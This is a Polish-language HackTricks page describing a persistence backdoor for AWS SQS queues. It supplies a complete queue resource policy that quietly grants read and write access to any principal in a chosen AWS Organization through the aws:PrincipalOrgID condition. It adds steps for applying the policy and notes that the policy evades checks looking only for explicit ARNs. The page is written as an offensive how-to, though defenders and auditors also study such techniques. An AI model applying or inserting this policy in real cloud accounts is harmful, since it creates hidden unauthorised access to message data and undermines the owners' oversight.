# AWS - SQS OrgID Policy Backdoor

{{#include ../../../../banners/hacktricks-training.md}}

Wykorzystaj politykę zasobu kolejki SQS, aby cicho przyznać uprawnienia Send, Receive i ChangeMessageVisibility dowolnemu principalowi należącemu do docelowej AWS Organization, używając warunku aws:PrincipalOrgID. Tworzy to ukrytą ścieżkę ograniczoną do organizacji (org-scoped), która często omija zabezpieczenia sprawdzające tylko jawne ARNy kont lub ról albo star principals.

### Backdoor policy (dołącz do polityki kolejki SQS)
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "OrgScopedBackdoor",
"Effect": "Allow",
"Principal": "*",
"Action": [
"sqs:ReceiveMessage",
"sqs:SendMessage",
"sqs:ChangeMessageVisibility",
"sqs:GetQueueAttributes"
],
"Resource": "arn:aws:sqs:REGION:ACCOUNT_ID:QUEUE_NAME",
"Condition": {
"StringEquals": { "aws:PrincipalOrgID": "o-xxxxxxxxxx" }
}
}
]
}
```
### Kroki
- Uzyskaj Organization ID za pomocą AWS Organizations API.
- Pobierz ARN kolejki SQS i ustaw queue policy tej kolejki, zawierającą powyższe statement.
- Z dowolnego principal należącego do tej Organization wyślij i odbierz wiadomość z kolejki, aby zweryfikować dostęp.

### Wpływ
- Ukryty dostęp w skali całej organizacji do odczytu i zapisu wiadomości SQS z dowolnego konta w określonej AWS Organization.

{{#include ../../../../banners/hacktricks-training.md}}
